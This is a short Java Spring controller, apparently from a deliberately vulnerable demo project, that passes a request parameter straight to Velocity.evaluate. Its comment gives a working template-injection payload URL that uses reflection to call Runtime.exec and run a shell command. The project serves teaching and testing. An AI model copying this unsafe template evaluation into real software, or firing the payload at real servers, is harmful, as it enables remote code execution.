package org.javaweb.vuln.controller;

import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.Velocity;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

import java.io.StringWriter;

import static org.springframework.http.HttpStatus.OK;

@Controller
@RequestMapping("/Velocity/")
public class VelocityController {

	/**
	 * Velocity 模板注入示例
	 * Payload：http://localhost:8001/Velocity/template.do?custom=%23set($e=%22e%22);$e.getClass().forName(%22org.apache.commons.io.IOUtils%22).getMethod(%22toString%22,$e.getClass().forName(%22java.io.InputStream%22)).invoke(null,%20$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22pwd%22).getInputStream())
	 *
	 * @param custom 注入的模板字符串
	 * @return 模板渲染结果
	 */
	@RequestMapping("/template.do")
	public ResponseEntity<byte[]> velocity(String custom) {
		StringWriter sw = new StringWriter();
		Velocity.evaluate(new VelocityContext(), sw, "tag", custom);

		return new ResponseEntity<byte[]>(sw.toString().getBytes(), OK);
	}

}
